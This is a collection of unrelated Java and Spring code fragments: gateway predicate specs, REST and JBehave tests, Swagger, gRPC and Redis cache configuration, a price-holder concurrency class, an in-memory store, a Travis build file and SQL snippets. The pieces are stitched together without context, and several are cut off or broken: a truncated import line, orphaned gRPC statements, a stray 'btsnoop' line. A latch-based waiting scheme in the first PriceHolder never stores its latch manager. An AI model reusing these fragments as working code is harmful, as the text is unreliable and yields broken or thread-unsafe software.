	public BooleanSpec(Route.Builder routeBuilder, RouteLocatorBuilder.Builder builder) {
		super(routeBuilder, builder);
		// save current predicate useful in kotlin dsl
		predicate = routeBuilder.getPredicate();
	}

	public BooleanOpSpec and() {
		return new BooleanOpSpec(routeBuilder, builder, AND);
	}

	public BooleanOpSpec or() {
		return new BooleanOpSpec(routeBuilder, builder, OR);
	}

	public BooleanOpSpec negate() {
		return new BooleanOpSpec(routeBuilder, builder, NEGATE);
	}

	public static class BooleanOpSpec extends PredicateSpec {

		private Operator operator;

		BooleanOpSpec(Route.Builder routeBuilder, RouteLocatorBuilder.Builder builder, Operator operator) {
			super(routeBuilder, builder);
			Assert.notNull(operator, "operator may not be null");
			this.operator = operator;
		}

		@Override
		public BooleanSpec predicate(Predicate<ServerWebExchange> predicate) {
			switch (this.operator) {
				case AND:
					this.routeBuilder.and(predicate);
					break;
				case OR:
					this.routeBuilder.or(predicate);
					break;
				case NEGATE:
					this.routeBuilder.negate();
			}
			return createBooleanSpec();
		}
	}
}
--------------------------------------------------------------------------------------------------------
    String outputDir = System.getProperty("io.springfox.staticdocs.outputDir");
    String snippetsDir = System.getProperty("io.springfox.staticdocs.snippetsOutputDir");
    String asciidocOutputDir = System.getProperty("generated.asciidoc.directory");
	
--------------------------------------------------------------------------------------------------------
port com.hantsylabs.restexample.springmvc.repository.PostRepository;
import org.jbehave.core.annotations.Given;
import org.jbehave.core.annotations.Named;
import org.jbehave.core.annotations.Then;
import org.jbehave.core.annotations.When;
import static org.junit.Assert.assertTrue;
import org.springframework.boot.test.web.client.TestRestTemplate;

import org.springframework.http.ResponseEntity;

public class PostSteps {

    PostRepository postRepository;

    TestRestTemplate restTemplate;

    String baseUrl;

    public PostSteps(PostRepository postRepository,
            TestRestTemplate restTemplate,
            String baseUrl) {
        this.postRepository = postRepository;
        this.restTemplate = restTemplate;
        this.baseUrl = baseUrl;
    }

    ResponseEntity<String> reponseEntity;

    @Given("post title is $title and content is $content")
    public void savePost(@Named("title") String title, @Named("content") String content) {
        postRepository.save(new Post(title, content));
    }

    @When("GET $path")
    public void getPost(@Named("path") String path) {
        reponseEntity = restTemplate.getForEntity(baseUrl + path, String.class);
    }

    @Then("response status is $code")
    public void responseCode(@Named("code") int code) {
        assertTrue(reponseEntity.getStatusCode().value() == code);
    }

    @Then("response body contains $body")
    public void responseBody(@Named("body") String body) {
        assertTrue(reponseEntity.getBody().contains(body));
    }

}

import com.hantsylabs.restexample.springmvc.repository.PostRepository;
import com.hantsylabs.restexample.springmvc.test.jbehave.AcceptanceTest;
import com.hantsylabs.restexample.springmvc.test.jbehave.AbstractSpringJBehaveStory;
import com.hantsylabs.restexample.springmvc.test.jbehave.steps.PostSteps;
import javax.inject.Inject;
import org.junit.Before;
import org.junit.runner.RunWith;
import org.springframework.boot.context.embedded.LocalServerPort;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.test.web.client.TestRestTemplate.HttpClientOption;

import org.springframework.test.context.junit4.SpringRunner;

@RunWith(SpringRunner.class)
@AcceptanceTest
public class PostStory extends AbstractSpringJBehaveStory {

    @Inject
    PostRepository postRepository;

    TestRestTemplate restTemplate;

    String baseUrl;

    @LocalServerPort
    int port;

    @Before
    public void setup() {
        clearData();
        initData();
        this.baseUrl = "http://localhost:" + port;
        this.restTemplate = new TestRestTemplate("admin", "test123", new HttpClientOption[]{});
    }

    @Override
    public Object[] getSteps() {
        return new Object[]{new PostSteps(postRepository, restTemplate, baseUrl)};
    }

}
--------------------------------------------------------------------------------------------------------
import com.hantsylabs.restexample.springmvc.model.PostForm;
import com.hantsylabs.restexample.springmvc.repository.PostRepository;
import com.hantsylabs.restexample.springmvc.test.WebIntegrationTestBase;
import com.jayway.restassured.RestAssured;
import com.jayway.restassured.http.ContentType;
import org.apache.http.HttpStatus;
import org.junit.Before;
import org.junit.Test;

import com.jayway.restassured.response.Response;
import javax.inject.Inject;
import static org.hamcrest.CoreMatchers.containsString;
import static com.jayway.restassured.RestAssured.given;
import lombok.extern.slf4j.Slf4j;
import static org.hamcrest.CoreMatchers.is;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.context.SpringBootTest.WebEnvironment;
import org.springframework.test.context.junit4.SpringRunner;

@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT)
@Slf4j
public class RestAssuredApplicationTest extends WebIntegrationTestBase {


    @Before
    public void beforeTest() {
        super.setup();
        RestAssured.port = port;
    }

    @Test
    public void testDeletePostNotExisted() {
        String location = "/api/posts/1000";

        given()
                .auth().basic(USER_NAME, PASSWORD)
                .contentType(ContentType.JSON)
                .when()
                .delete(location)
                .then()
                .assertThat()
                .statusCode(HttpStatus.SC_NOT_FOUND);
    }

    @Test
    public void testGetPostNotExisted() {
        String location = "/api/posts/1000";

        given()
                .auth().basic(USER_NAME, PASSWORD)
                .contentType(ContentType.JSON)
                .when()
                .get(location)
                .then()
                .assertThat()
                .statusCode(HttpStatus.SC_NOT_FOUND);
    }

    @Test
    public void testPostFormInValid() {
        PostForm form = new PostForm();

        given()
                .auth().basic(USER_NAME, PASSWORD)
                .body(form)
                .contentType(ContentType.JSON)
                .when()
                .post("/api/posts")
                .then()
                .assertThat()
                .statusCode(HttpStatus.SC_BAD_REQUEST);
    }

    @Test
    public void testPostCRUD() {
        PostForm form = new PostForm();
        form.setTitle("test title");
        form.setContent("test content");

        Response response = given()
                .auth().basic(USER_NAME, PASSWORD)
                .body(form)
                .contentType(ContentType.JSON)
                .when()
                .post("/api/posts")
                .then()
                .assertThat()
                .statusCode(HttpStatus.SC_CREATED)
                .and()
                .header("Location", containsString("/api/posts/"))
                .extract().response();

        String location = response.header("Location");

        log.debug("header location value @" + location);

        given().auth().basic(USER_NAME, PASSWORD)
                .contentType(ContentType.JSON)
                .when()
                .get(location)
                .then()
                .assertThat()
                .body("title", is("test title"))
                .body("content", is("test content"));

        PostForm updateForm = new PostForm();
        updateForm.setTitle("test udpate title");
        updateForm.setContent("test update content");

        given()
                .auth().basic(USER_NAME, PASSWORD)
                .body(updateForm)
                .contentType(ContentType.JSON)
                .when()
                .put(location)
                .then()
                .assertThat()
                .statusCode(HttpStatus.SC_NO_CONTENT);

        given().auth().basic(USER_NAME, PASSWORD)
                .contentType(ContentType.JSON)
                .when()
                .get(location)
                .then()
                .assertThat()
                .body("title", is("test udpate title"))
                .body("content", is("test update content"));

        given()
                .auth().basic(USER_NAME, PASSWORD)
                .contentType(ContentType.JSON)
                .when()
                .delete(location)
                .then()
                .assertThat()
                .statusCode(HttpStatus.SC_NO_CONTENT);

        given().auth().basic(USER_NAME, PASSWORD)
                .contentType(ContentType.JSON)
                .when()
                .get(location)
                .then()
                .assertThat()
                .statusCode(HttpStatus.SC_NOT_FOUND);
    }
}
--------------------------------------------------------------------------------------------------------
import com.google.common.base.Predicate;
import com.google.common.base.Predicates;
import com.google.common.collect.Lists;
import com.hantsylabs.restexample.springmvc.domain.User;
import java.time.LocalDateTime;
import java.util.ArrayList;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import springfox.bean.validators.configuration.BeanValidatorPluginsConfiguration;
import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.AuthorizationScopeBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.service.AuthorizationScope;
import springfox.documentation.service.BasicAuth;
import springfox.documentation.service.Contact;
import springfox.documentation.service.SecurityReference;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spi.service.contexts.SecurityContext;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

@Configuration
@EnableSwagger2
//@Profile(value = {"dev", "test", "staging"})// Loads the spring beans required by the framework
@Import(BeanValidatorPluginsConfiguration.class)
public class SwaggerConfig {

    @Bean
    public Docket userApi() {
        AuthorizationScope[] authScopes = new AuthorizationScope[1];
        authScopes[0] = new AuthorizationScopeBuilder()
                .scope("read")
                .description("read access")
                .build();
        SecurityReference securityReference = SecurityReference.builder()
                .reference("test")
                .scopes(authScopes)
                .build();
        ArrayList<SecurityContext> securityContexts = Lists.newArrayList(
                SecurityContext.builder()
                        .securityReferences(Lists.newArrayList(securityReference))
                        .build()
        );
        return new Docket(DocumentationType.SWAGGER_2)
                .directModelSubstitute(LocalDateTime.class, String.class)
                .ignoredParameterTypes(User.class)
                .securitySchemes(Lists.newArrayList(new BasicAuth("test")))
                .securityContexts(securityContexts)
                .apiInfo(apiInfo())
                .select()
                .paths(apiPaths())
                .build();
    }

    private Predicate<String> apiPaths() {
        return Predicates.or(PathSelectors.regex("/api/.*"));
    }

    //        private Predicate<String> userOnlyEndpoints() {
    //            return (String input) -> input.contains("user");
    //        }
    private ApiInfo apiInfo() {
        return new ApiInfoBuilder()
                .title("AngularJS Spring MVC Example API")
                .description("The online reference documentation for developers")
                .termsOfServiceUrl("http://hantsy.blogspot.com")
                .contact(new Contact("Hantsy Bai", "http://hantsy.blogspot.com", "hantsy@gmail.com"))
                .license("Apache License Version 2.0")
                .licenseUrl("https://github.com/hantsy/angularjs-springmvc-sample-boot/blob/master/LICENSE")
                .version("2.0")
                .build();
    }

}
--------------------------------------------------------------------------------------------------------
@API(status = EXPERIMENTAL, since = "5.3")
public enum ExecutionMode {

	/**
	 * Force execution in same thread as the parent node.
	 *
	 * @see #CONCURRENT
	 */
	SAME_THREAD,

	/**
	 * Allow concurrent execution with any other node.
	 *
	 * @see #SAME_THREAD
	 */
	CONCURRENT
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Value;

import java.lang.annotation.*;

@Target({ ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER,
        ElementType.ANNOTATION_TYPE })
@Retention(RetentionPolicy.RUNTIME)
@Documented
@Value("${grpc.port !=0 ? ${grpc.port}:${local.grpc.port}}")
public @interface LocalRunningGrpcPort {
}
--------------------------------------------------------------------------------------------------------
        Collection<ServerInterceptor> globalInterceptors = getBeanNamesByTypeWithAnnotation(GRpcGlobalInterceptor.class, ServerInterceptor.class)
                .map(name -> applicationContext.getBeanFactory().getBean(name, ServerInterceptor.class))
                .collect(Collectors.toList());
				
                    GRpcService gRpcServiceAnn = applicationContext.findAnnotationOnBean(name, GRpcService.class);
                    serviceDefinition = bindInterceptors(serviceDefinition, gRpcServiceAnn, globalInterceptors);
					
					        Stream<? extends ServerInterceptor> privateInterceptors = Stream.of(gRpcService.interceptors())
                .map(interceptorClass -> {
                    try {
                        return 0 < applicationContext.getBeanNamesForType(interceptorClass).length ?
                                applicationContext.getBean(interceptorClass) :
                                interceptorClass.newInstance();
                    } catch (Exception e) {
                        throw new BeanCreationException("Failed to create interceptor instance.", e);
                    }
                });

        List<ServerInterceptor> interceptors = Stream.concat(
                gRpcService.applyGlobalInterceptors() ? globalInterceptors.stream() : Stream.empty(),
                privateInterceptors)
                .distinct()
                .sorted(serverInterceptorOrderComparator())
                .collect(Collectors.toList());
        return ServerInterceptors.intercept(serviceDefinition, interceptors);
--------------------------------------------------------------------------------------------------------
import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import org.springframework.stereotype.Component;

/**
 * Created by jamessmith on 9/7/16.
 */
@Target({ElementType.TYPE,ElementType.METHOD })
@Retention(RetentionPolicy.RUNTIME)
@Documented
@Component
public @interface GRpcGlobalInterceptor {
}
--------------------------------------------------------------------------------------------------------
@AutoConfigureOrder
@ConditionalOnBean(annotation = GRpcService.class)
@EnableConfigurationProperties(GRpcServerProperties.class)
public class GRpcAutoConfiguration {

    @Autowired
    private ApplicationContext applicationContext;

    @Autowired
    private GRpcServerProperties grpcServerProperties;



    @Bean
    @ConditionalOnProperty(value = "grpc.enabled", havingValue = "true", matchIfMissing = true)
    public GRpcServerRunner grpcServerRunner(GRpcServerBuilderConfigurer configurer) {
        return new GRpcServerRunner(configurer, ServerBuilder.forPort(grpcServerProperties.getPort()));
    }

    @Bean
    @ConditionalOnExpression("#{environment.getProperty('grpc.inProcessServerName','')!=''}")
    public GRpcServerRunner grpcInprocessServerRunner(GRpcServerBuilderConfigurer configurer){
        return new GRpcServerRunner(configurer, InProcessServerBuilder.forName(grpcServerProperties.getInProcessServerName()));
    }



    @Bean
    public HealthStatusManager healthStatusManager() {
        return new HealthStatusManager();
    }

    @Bean
    @ConditionalOnMissingBean(  GRpcServerBuilderConfigurer.class)
    public GRpcServerBuilderConfigurer serverBuilderConfigurer(){
        return new GRpcServerBuilderConfigurer();
    }
}
--------------------------------------------------------------------------------------------------------
import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import io.grpc.ServerInterceptor;
import org.springframework.stereotype.Service;

/**
 *
 * Marks the annotated class to be registered as grpc-service bean;
 * @author  Furer Alexander
 * @since 0.0.1
 */
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
@Service
public @interface GRpcService {
    Class<? extends ServerInterceptor>[] interceptors() default {};
    boolean applyGlobalInterceptors() default true;
}
--------------------------------------------------------------------------------------------------------
	/**
	 * Common message code formats.
	 * @see MessageCodeFormatter
	 * @see DefaultMessageCodesResolver#setMessageCodeFormatter(MessageCodeFormatter)
	 */
	public enum Format implements MessageCodeFormatter {

		/**
		 * Prefix the error code at the beginning of the generated message code. e.g.:
		 * {@code errorCode + "." + object name + "." + field}
		 */
		PREFIX_ERROR_CODE {
			@Override
			public String format(String errorCode, @Nullable String objectName, @Nullable String field) {
				return toDelimitedString(errorCode, objectName, field);
			}
		},

		/**
		 * Postfix the error code at the end of the generated message code. e.g.:
		 * {@code object name + "." + field + "." + errorCode}
		 */
		POSTFIX_ERROR_CODE {
			@Override
			public String format(String errorCode, @Nullable String objectName, @Nullable String field) {
				return toDelimitedString(objectName, field, errorCode);
			}
		};

		/**
		 * Concatenate the given elements, delimiting each with
		 * {@link DefaultMessageCodesResolver#CODE_SEPARATOR}, skipping zero-length or
		 * null elements altogether.
		 */
		public static String toDelimitedString(String... elements) {
			StringJoiner rtn = new StringJoiner(CODE_SEPARATOR);
			for (String element : elements) {
				if (StringUtils.hasLength(element)) {
					rtn.add(element);
				}
			}
			return rtn.toString();
		}
	}
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.util.concurrent.*;

public final class PriceHolder {

    //map each entity to object which contains the current price, the hasPriceChanged boolean and a queue of countdownlatchs

    private final ConcurrentHashMap<String, BigDecimal> prices = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, Boolean> hasPriceChanged = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, CountDownLatchManager> entityThreadCountDownLatches = new ConcurrentHashMap<>();

    public PriceHolder() { }

    /** Called when a price ‘p’ is received for an entity ‘e’ */
    public void putPrice(final String e, final BigDecimal p) {
        prices.compute(e, (key, value) -> {
            hasPriceChanged.put(e, true);
            entityThreadCountDownLatches
                    .getOrDefault(e, new CountDownLatchManager())
                    .unblockFirstWaitingThread();
            return p;
        });
    }

    /** Called to get the latest price for entity ‘e’ */
    public BigDecimal getPrice(final String e) {
        return prices.compute(e, (k, v) -> {
            hasPriceChanged.put(e, false);
            return v;
        });
    }

    /**
     * Called to determine if the price for entity ‘e’ has
     * changed since the last call to getPrice(e).
     */
    public boolean hasPriceChanged(final String e) {
        return hasPriceChanged.getOrDefault(e, false);
    }

    /**
     * Returns the next price for entity ‘e’. If the price has changed since the last
     * call to getPrice() or waitForNextPrice(), it returns immediately that price.
     * Otherwise it blocks until the next price change for entity ‘e’.
     * If multiple threads from the same entity ‘e’ call this function they will
     * wait in a FIFO manner and each thread will receive a new price.
     */
    public BigDecimal waitForNextPrice(final String e) throws InterruptedException {
        while (!hasPriceChanged(e)) {
            waitForPutPriceToBeCalledForEntity(e);
        }
        return getPrice(e);
    }

    private void waitForPutPriceToBeCalledForEntity(String e) throws InterruptedException {
        entityThreadCountDownLatches.merge(e, new CountDownLatchManager() , (oldLatches, newLatches) -> {
            oldLatches.addNewLatch();
            return oldLatches;
        }).awaitOnLastLatch();
    }
}

import java.util.LinkedList;
import java.util.concurrent.CountDownLatch;

public class CountDownLatchManager {

    private LinkedList<CountDownLatch> countDownLatches = new LinkedList<>();

    /** If the list is populated, the first CountDownLatch will be counted down */
    public void unblockFirstWaitingThread() {
        if (countDownLatches.size() > 0) {
            countDownLatches.removeFirst().countDown();
        }
    }

    /** Adds a single step CountDownLatch to the back on the list */
    public void addNewLatch() {
        countDownLatches.addLast(new CountDownLatch(1));
    }

    /** Awaits for the last CountDownLatch to be counted down */
    public void awaitOnLastLatch() throws InterruptedException {
        if (countDownLatches.size() > 0) {
            countDownLatches.getLast().await();
        }
    }
}
--------------------------------------------------------------------------------------------------------
package com.memory;
 
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
 
/**
 * Timeout functionnality for the memory store
 * @author Deisss (LGPLv3)
 * @version 0.1
 */
class TimeoutMemoryStore extends TimerTask{
    private String key;
 
    /**
     * Constructor
     * @param key The key to use & store
     */
    public TimeoutMemoryStore(String key){
        this.key = key;
    }
 
    @Override
    public void run() {
        if(this.key != null & this.key.length() > 0){
            MemoryStore.delete(this.key);
        }
    }
}
 
/**
 * The memory store will keep data inside the class, for a specific amout of time
 * @author Deisss (LGPLv3)
 * @version 0.1
 */
public class MemoryStore {
    //This will store any kind of object, related to a specific key value in string
    private static HashMap<String, Object> mem;
 
    /**
     * Add an object into the memory store
     * @param obj The object to store
     * @return The key stored
     */
    public static String add(Object obj){
        return add(obj, 0);
    }
 
    /**
     * Add an object into the memory store
     * @param obj The object to store
     * @param timeout The delay in ms
     * @return The key store
     */
    public static String add(Object obj, long timeout){
        //If the system is not functionnal
        if(mem == null){
            erase();
        }
 
        //Generating a unique id
        String gen = generate(16);
        while(mem.containsKey(gen)){
            gen = generate(16);
        }
 
        mem.put(gen, obj);
 
        //Create a delete operation after timeout
        if(timeout > 0){
            new Timer().schedule(new TimeoutMemoryStore(gen), timeout);
        }
 
        return gen;
    }
 
    /**
     * Get a specific object regarding key
     * @param key The key to search
     * @return The object retrieve, or null if nothing found
     */
    public static Object get(String key){
        if(mem.containsKey(key)){
            return mem.get(key);
        }else{
            return null;
        }
    }
 
    /**
     * Delete an entry from the memory store
     * @param key The key to delete
     * @return The delete value result (true if the object has been found, false in other case)
     */
    public static boolean delete(String key){
        if(mem.containsKey(key)){
            mem.remove(key);
            return true;
        }
        return false;
    }
 
    /**
     * Empty the memory store
     */
    public static void erase(){
        mem = new HashMap<String, Object>();
    }
 
    /**
     * This generate a random string of the given size
     * @param length The output length to retrieve
     * @return The generated string
     */
    private static String generate(int length){
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        int charLength = chars.length();
        String pass = "";
        for(int x=0; x<length; x++){
            int i = (int) Math.floor(Math.random() * charLength);
            pass += chars.charAt(i);
        }
        return pass;
    }
}
--------------------------------------------------------------------------------------------------------
language: android
jdk: oraclejdk8

notifications:
  email: false

android:
  components:
    - tools
    - build-tools-28.0.3
    - android-28
    - extra-android-support
    - extra-android-m2repository
  licenses:
      - 'android-sdk-preview-license-.+'
      - 'android-sdk-license-.+'
      - 'google-gdk-license-.+'

before_install:
  - chmod +x gradlew
  - yes | sdkmanager "platforms;android-27"

script: ./gradlew clean assemble test

after_success: ./gradlew jacocoRootReport coveralls
--------------------------------------------------------------------------------------------------------
<property name="hibernate.current_session_context_class">jta</property>

        <property name="hibernate.transaction.factory_class">org.hibernate.engine.transaction.internal.jta.JtaTransactionFactory</property>

        <property name="hibernate.transaction.jta.platform">org.hibernate.engine.transaction.jta.platform.internal.JBossAppServerJtaPlatform</property>
		
hibernate.allow_update_outside_transaction = true 
--------------------------------------------------------------------------------------------------------
PRAGMA foreign_keys = "1";
SELECT type,name,sql,tbl_name,'0' AS temp FROM sqlite_master UNION SELECT type,name,sql,tbl_name,'1' AS temp FROM sqlite_temp_master;
PRAGMA encoding

btsnoop


--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal;
import java.util.concurrent.ConcurrentHashMap;

public final class PriceHolder {

    private final ConcurrentHashMap<String, BigDecimal> prices = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, Boolean> hasPriceChanged = new ConcurrentHashMap<>();

    public PriceHolder() { }

    /** Called when a price ‘p’ is received for an entity ‘e’ */
    public void putPrice(final String e, final BigDecimal p) {
        prices.compute(e, (key, value) -> {
            hasPriceChanged.put(e, true);
            return p;
        });
    }

    /** Called to get the latest price for entity ‘e’ */
    public BigDecimal getPrice(String e) {
        return prices.compute(e, (k, v) -> {
            hasPriceChanged.put(e, false);
           return v;
        });
    }

    /**
     * Called to determine if the price for entity ‘e’ has
     * changed since the last call to getPrice(e).
     */
    public boolean hasPriceChanged(String e) {
        return hasPriceChanged.getOrDefault(e, false);
    }
}
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.system.configuration;
//
//import com.fasterxml.jackson.databind.ObjectMapper;
//import com.paragon.mailingcontour.commons.registry.model.RegistryApplicationData;
//import org.springframework.cache.CacheManager;
//import org.springframework.context.annotation.Bean;
//import org.springframework.context.annotation.Configuration;
//import org.springframework.data.redis.cache.RedisCacheManager;
//import org.springframework.data.redis.connection.RedisConnectionFactory;
//import org.springframework.data.redis.core.StringRedisTemplate;
//import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;
//import org.springframework.data.redis.serializer.RedisSerializer;
//import org.springframework.data.redis.serializer.StringRedisSerializer;
//
//@Configuration
//public class CacheConfiguration {
//
//    @Bean
//    public StringRedisTemplate registryTemplate(final ObjectMapper objectMapper, final RedisConnectionFactory redisConnectionFactory) {
//        final StringRedisTemplate template = new StringRedisTemplate(redisConnectionFactory);
//        template.setEnableTransactionSupport(true);
//        template.setKeySerializer(new StringRedisSerializer());
//        template.setValueSerializer(this.registryValueSerializer(objectMapper));
////        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());
//        template.afterPropertiesSet();
//        return template;
//    }
//
//    @Bean
//    public CacheManager cacheManager(final RedisConnectionFactory redisConnectionFactory) {
//        return RedisCacheManager.RedisCacheManagerBuilder.fromConnectionFactory(redisConnectionFactory).build();
//    }
//
//    public RedisSerializer<RegistryApplicationData> registryValueSerializer(final ObjectMapper objectMapper) {
//        final Jackson2JsonRedisSerializer<RegistryApplicationData> jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer<>(RegistryApplicationData.class);
//        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);
//        return jackson2JsonRedisSerializer;
//    }
//}

--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@EnableSwagger2
@EnableCaching
public class Application extends SpringBootServletInitializer {

  public static void main(final String[] args) throws Exception {
    SpringApplication.run(Application.class, args);
  }

  @Primary
  @Bean
  public RedisCacheManager cacheManager(final RedisConnectionFactory connectionFactory) {
    final RedisCacheWriter redisCacheWriter = RedisCacheWriter.lockingRedisCacheWriter(connectionFactory);
    final SerializationPair<Object> valueSerializationPair = RedisSerializationContext.SerializationPair.fromSerializer(new GenericJackson2JsonRedisSerializer());
    final RedisCacheConfiguration cacheConfiguration = RedisCacheConfiguration.defaultCacheConfig();
    final RedisCacheManager redisCacheManager = new RedisCacheManager(redisCacheWriter, cacheConfiguration);
    return redisCacheManager;
  }

  @Bean(name = "pickleCacheManager")
  public RedisCacheManager pickleCacheManager(final RedisConnectionFactory connectionFactory) {
    final RedisCacheWriter redisCacheWriter = RedisCacheWriter.lockingRedisCacheWriter(connectionFactory);
    final SerializationPair<Object> valueSerializationPair = RedisSerializationContext.SerializationPair.fromSerializer(new GenericJackson2JsonRedisSerializer());
    RedisCacheConfiguration cacheConfiguration = RedisCacheConfiguration.defaultCacheConfig();
    cacheConfiguration = cacheConfiguration.entryTtl(Duration.ofSeconds(120));
    final RedisCacheManager redisCacheManager = new RedisCacheManager(redisCacheWriter, cacheConfiguration);
    return redisCacheManager;
  }

  @Bean(name = "userCacheManager")
  public RedisCacheManager userCacheManager(final RedisConnectionFactory connectionFactory) {
    final RedisCacheWriter redisCacheWriter = RedisCacheWriter.lockingRedisCacheWriter(connectionFactory);
    final SerializationPair<Object> valueSerializationPair = RedisSerializationContext.SerializationPair.fromSerializer(new GenericJackson2JsonRedisSerializer());
    RedisCacheConfiguration cacheConfiguration = RedisCacheConfiguration.defaultCacheConfig();
    cacheConfiguration = cacheConfiguration.entryTtl(Duration.ofSeconds(172800));
    final RedisCacheManager redisCacheManager = new RedisCacheManager(redisCacheWriter, cacheConfiguration);
    return redisCacheManager;
  }

}
--------------------------------------------------------------------------------------------------------

    @Id
    @SequenceGenerator(name = "SEQ_GEN", sequenceName = "SEQ_USER", allocationSize = 1)
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "SEQ_GEN")
    private Long id;
    private String name;
    private long followers;
--------------------------------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS `articles` (
  `article_id` int(5) NOT NULL AUTO_INCREMENT,
  `title` varchar(200) NOT NULL,
  `category` varchar(100) NOT NULL,
  PRIMARY KEY (`article_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

INSERT INTO `articles` (`article_id`, `title`, `category`) VALUES
	(1, 'Spring REST Security', 'Spring'),
	(2, 'Java Concurrency', 'Java'); 
--------------------------------------------------------------------------------------------------------
@Repository
public class RedisRepositoryImpl implements RedisRepository {
    private static final String KEY = "Movie";
    private RedisTemplate<String, Object> redisTemplate;
    private HashOperations hashOperations;
    @Autowired
    public RedisRepositoryImpl(RedisTemplate<String, Object> redisTemplate){
        this.redisTemplate = redisTemplate;
    }
    @PostConstruct
    private void init(){
        hashOperations = redisTemplate.opsForHash();
    }
    public void add(final Movie movie) {
        hashOperations.put(KEY, movie.getId(), movie.getName());
    }
    public void delete(final String id) {
        hashOperations.delete(KEY, id);
    }
    public Movie findMovie(final String id){
        return (Movie) hashOperations.get(KEY, id);
    }
    public Map<Object, Object> findAllMovies(){
        return hashOperations.entries(KEY);
    }
}
--------------------------------------------------------------------------------------------------------
import java.time.Duration;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;
import org.springframework.core.env.Environment;
import org.springframework.data.redis.cache.RedisCacheConfiguration;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.RedisPassword;
import org.springframework.data.redis.connection.RedisStandaloneConfiguration;
import org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;

@Configuration
@EnableCaching
@PropertySource("classpath:application.properties")
public class RedisConfig {
   @Autowired
   private Environment env;	
	
   @Bean
   public LettuceConnectionFactory redisConnectionFactory() {
	RedisStandaloneConfiguration redisConf = new RedisStandaloneConfiguration();
	redisConf.setHostName(env.getProperty("spring.redis.host"));
	redisConf.setPort(Integer.parseInt(env.getProperty("spring.redis.port")));
	redisConf.setPassword(RedisPassword.of(env.getProperty("spring.redis.password")));	    
        return new LettuceConnectionFactory(redisConf);
   }
   @Bean
   public RedisCacheConfiguration cacheConfiguration() {
	RedisCacheConfiguration cacheConfig = RedisCacheConfiguration.defaultCacheConfig()
	  .entryTtl(Duration.ofSeconds(600))
	  .disableCachingNullValues();	
	return cacheConfig;
   }
   @Bean
   public RedisCacheManager cacheManager() {
	RedisCacheManager rcm = RedisCacheManager.builder(redisConnectionFactory())
	  .cacheDefaults(cacheConfiguration())
	  .transactionAware()
	  .build();
	return rcm;
   }  
} 
--------------------------------------------------------------------------------------------------------
@Cacheable(value = "post-single", key = "#id", unless = "#result.shares < 500")
@GetMapping("/{id}")
public Post getPostByID(@PathVariable String id) throws PostNotFoundException {
    log.info("get post with id {}", id);
    return postService.getPostByID(id);
}
@Cacheable(value = "post-top")
@GetMapping("/top")
public List<Post> getTopPosts() {
    return postService.getTopPosts();
}
@CachePut(value = "post-single", key = "#post.id")
@PutMapping("/update")
public Post updatePostByID(@RequestBody Post post) throws PostNotFoundException {
    log.info("update post with id {}", post.getId());
    postService.updatePost(post);
    return post;
}
@CacheEvict(value = "post-single", key = "#id")
@DeleteMapping("/delete/{id}")
public void deletePostByID(@PathVariable String id) throws PostNotFoundException {
    log.info("delete post with id {}", id);
    postService.deletePost(id);
}

@CacheEvict(value = "post-top")
@GetMapping("/top/evict")
public void evictTopPosts() {
    log.info("Evict post-top");
}

--------------------------------------------------------------------------------------------------------
import java.util.UUID;

import org.springframework.boot.bind.RelaxedPropertyResolver;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.EnvironmentAware;
import org.springframework.core.env.Environment;
import org.springframework.util.StringUtils;

import lombok.Data;
import lombok.extern.slf4j.Slf4j;

@ConfigurationProperties(prefix = "cereebro", ignoreUnknownFields = true)
@Data
@Slf4j
public final class CereebroProperties implements EnvironmentAware {

    private ComponentRelationshipsProperties application = new ComponentRelationshipsProperties();
    private SnitchProperties snitch = new SnitchProperties();

    @Override
    public void setEnvironment(Environment env) {
        if (!StringUtils.hasText(application.getComponent().getName())) {
            // set the application name from the environment,
            // but allow the defaults to use relaxed binding
            // (shamelessly copied from Spring Boot)
            RelaxedPropertyResolver springPropertyResolver = new RelaxedPropertyResolver(env, "spring.application.");
            String appName = springPropertyResolver.getProperty("name");
            application.getComponent().setName(StringUtils.hasText(appName) ? appName : generateName());
        }
    }

    private String generateName() {
